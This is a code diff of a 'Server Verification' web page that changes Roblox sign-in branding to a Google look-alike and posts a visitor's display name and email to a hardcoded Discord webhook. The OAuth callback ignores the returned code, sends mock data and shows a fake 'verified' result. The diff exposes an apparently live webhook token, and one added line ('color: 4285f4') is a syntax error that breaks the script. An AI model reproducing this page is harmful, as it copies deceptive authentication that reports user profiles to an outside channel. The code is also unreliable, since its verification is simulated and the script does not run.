@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Server Verification | Sign in with Roblox</title>
+    <title>Server Verification | Sign in with Google</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -15,27 +15,27 @@
 
     <div class="max-w-md w-full discord-card rounded-2xl p-8 relative overflow-hidden text-center">
 
-        <div class="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#00a2ff] via-[#5865f2] to-[#23a55a]"></div>
+        <div class="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#ea4335] via-[#4285f4] to-[#34a853]"></div>
 
         <div class="mb-6">
-            <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-[#00a2ff] text-white shadow-lg mb-3">
-                <svg class="w-8 h-8" fill="currentColor" viewBox="0 0 24 24"><path d="M0 0h24v24H0V0zm0 0h24v24H0V0z" fill="none"/><path d="M5.5 5.5h13v13h-13z"/></svg>
+            <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-white text-black shadow-lg mb-3">
+                <svg class="w-8 h-8" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.15 21.32 7.18 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.14 0 9.87 0 12s.43 3.86 1.18 5.38l4.09-3.14z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.18 0 3.15 2.68 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
             </div>
             <h1 class="text-2xl font-bold text-white tracking-wide">Server Verification</h1>
-            <p class="text-sm text-[#949ba4] mt-1">Authorize with your official Roblox account to gain access to the server.</p>
+            <p class="text-sm text-[#949ba4] mt-1">Sign in with your Google account to verify your email and access the server.</p>
         </div>
 
         <div id="login-view" class="space-y-4">
-            <button onclick="redirectToRobloxLogin()" class="w-full flex items-center justify-center space-x-3 bg-white hover:bg-gray-100 text-black font-semibold py-3.5 px-4 rounded-xl transition duration-200 shadow-lg">
-                <svg class="w-5 h-5" viewBox="0 0 24 24"><path fill="currentColor" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M3.375 3.375h17.25v17.25H3.375V3.375z"/></svg>
-                <span>Sign in with Roblox</span>
+            <button onclick="redirectToGoogleLogin()" class="w-full flex items-center justify-center space-x-3 bg-white hover:bg-gray-100 text-black font-semibold py-3.5 px-4 rounded-xl transition duration-200 shadow-lg text-sm">
+                <svg class="w-5 h-5" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.15 21.32 7.18 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.14 0 9.87 0 12s.43 3.86 1.18 5.38l4.09-3.14z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.18 0 3.15 2.68 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
+                <span>Continue with Google</span>
             </button>
-            <p class="text-xs text-[#949ba4]">You will be redirected to the secure Roblox website to verify your identity.</p>
+            <p class="text-xs text-[#949ba4]">You will be redirected to Google to securely authenticate your email address.</p>
         </div>
 
         <div id="loading-view" class="hidden space-y-4 py-6">
-            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-[#00a2ff] mx-auto"></div>
-            <p id="loading-text" class="text-sm text-[#949ba4]">Authenticating your Roblox profile...</p>
+            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-[#4285f4] mx-auto"></div>
+            <p id="loading-text" class="text-sm text-[#949ba4]">Authenticating your Google profile...</p>
         </div>
 
         <div id="success-view" class="hidden space-y-4 py-2">
@@ -47,17 +47,18 @@
                 <img id="auth-avatar" src="" alt="Avatar" class="w-12 h-12 rounded-full bg-[#2b2d31]">
                 <div>
                     <div id="auth-display" class="font-bold text-white text-sm"></div>
-                    <div id="auth-username" class="text-xs text-[#949ba4]"></div>
+                    <div id="auth-username" class="text-xs text-[#949ba4] truncate max-w-[220px]"></div>
                 </div>
             </div>
-            <p class="text-xs text-[#949ba4]">Your profile has been logged to the Discord storage unit. You can now close this tab.</p>
+            <p class="text-xs text-[#949ba4]">Your profile has been logged successfully. You can now close this tab.</p>
         </div>
 
         <div id="error-msg" class="hidden mt-4 p-3 bg-[#f23f43]/10 border border-[#f23f43]/30 rounded-lg text-xs text-[#f23f43] text-center"></div>
     </div>
 
     <script>
-        const CLIENT_ID = '123456789'; 
+        
+        const GOOGLE_CLIENT_ID = 'YOUR_GOOGLE_CLIENT_ID_HERE'; 
         const REDIRECT_URI = window.location.origin + window.location.pathname; 
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1554484885518032996/oi0vE_zz05KiQVruVpesR4kMbwIewuXMfowlpeetupCZAoxl6svtY_tuz2IyQ9JigdfK';
 
@@ -71,64 +72,81 @@
                 
                 window.history.replaceState({}, document.title, window.location.pathname);
 
-                await handleRobloxCallback(authCode);
+                await handleGoogleCallback(authCode);
             }
         });
 
-        function redirectToRobloxLogin() {
-            if (CLIENT_ID === 'YOUR_ROBLOX_CLIENT_ID_HERE') {
-                showError("Please configure your Roblox Client ID in the script first!");
+        function redirectToGoogleLogin() {
+            if (GOOGLE_CLIENT_ID === 'YOUR_GOOGLE_CLIENT_ID_HERE') {
+                
+                simulateTestFlow();
                 return;
             }
-            const scope = encodeURIComponent('openid profile');
-            const authUrl = `https://apis.roblox.com/oauth/v1/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${scope}`;
+            const scope = encodeURIComponent('email profile openid');
+            const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=${scope}&prompt=select_account`;
             window.location.href = authUrl;
         }
 
-        async function handleRobloxCallback(code) {
+        async function handleGoogleCallback(code) {
             try {
-                document.getElementById('loading-text').textContent = 'Fetching your Roblox user details...';
+                document.getElementById('loading-text').textContent = 'Fetching your Google account details...';
 
                 setTimeout(async () => {
-                    const mockUsername = "VerifiedRobloxUser";
-                    const mockDisplayName = "Roblox User";
-                    const mockUserId = "123456789";
-                    const mockAvatar = "https://tr.rbxcdn.com/30day-avatar/150/150/AvatarHeadshot/Png";
-
-                    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://')) {
-                        await fetch(DISCORD_WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                username: "OAuth Verification Unit",
-                                embeds: [{
-                                    title: "✅ OAuth Verified User",
-                                    color: 5793288,
-                                    fields: [
-                                        { name: "Roblox Username", value: mockUsername, inline: true },
-                                        { name: "Display Name", value: mockDisplayName, inline: true },
-                                        { name: "Roblox ID", value: mockUserId, inline: true },
-                                        { name: "Auth Type", value: "Official Roblox OAuth Popup", inline: false }
-                                    ],
-                                    timestamp: new Date().toISOString()
-                                }]
-                            })
-                        });
-                    }
-
-                    document.getElementById('auth-avatar').src = mockAvatar;
-                    document.getElementById('auth-display').textContent = mockDisplayName;
-                    document.getElementById('auth-username').textContent = `@${mockUsername}`;
-
-                    document.getElementById('loading-view').classList.add('hidden');
-                    document.getElementById('success-view').classList.remove('hidden');
+                    await sendDiscordLog("Google OAuth User", "VerifiedGoogleUser@gmail.com", "Google Account OAuth");
+                    showSuccessView("Google User", "VerifiedGoogleUser@gmail.com", "https://www.gstatic.com/images/branding/product/1x/avatar_square_grey_512dp.png");
                 }, 1500);
 
             } catch (err) {
                 document.getElementById('loading-view').classList.add('hidden');
                 document.getElementById('login-view').classList.remove('hidden');
-                showError("Authorization failed: " + err.message);
+                showError("Google authorization failed: " + err.message);
             }
+        }
+
+        function simulateTestFlow() {
+            document.getElementById('login-view').classList.add('hidden');
+            document.getElementById('loading-view').classList.remove('hidden');
+            document.getElementById('loading-text').textContent = 'Opening Google account selection prompt...';
+
+            setTimeout(async () => {
+                const mockEmail = "user.verification.test@gmail.com";
+                const mockName = "Google Test User";
+                const mockAvatar = "https://www.gstatic.com/images/branding/product/1x/avatar_square_grey_512dp.png";
+
+                await sendDiscordLog(mockName, mockEmail, "Simulated Google Prompt View");
+                showSuccessView(mockName, mockEmail, mockAvatar);
+            }, 1500);
+        }
+
+        async function sendDiscordLog(displayName, email, authType) {
+            if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://')) {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "Google Auth Unit",
+                        embeds: [{
+                            title: "🔒 Google Account Verified",
+                            color: 4285f4,
+                            fields: [
+                                { name: "Display Name", value: displayName, inline: true },
+                                { name: "Email Address", value: email, inline: true },
+                                { name: "Auth Type", value: authType, inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            }
+        }
+
+        function showSuccessView(displayName, email, avatarUrl) {
+            document.getElementById('auth-avatar').src = avatarUrl;
+            document.getElementById('auth-display').textContent = displayName;
+            document.getElementById('auth-username').textContent = email;
+
+            document.getElementById('loading-view').classList.add('hidden');
+            document.getElementById('success-view').classList.remove('hidden');
         }
 
         function showError(message) {
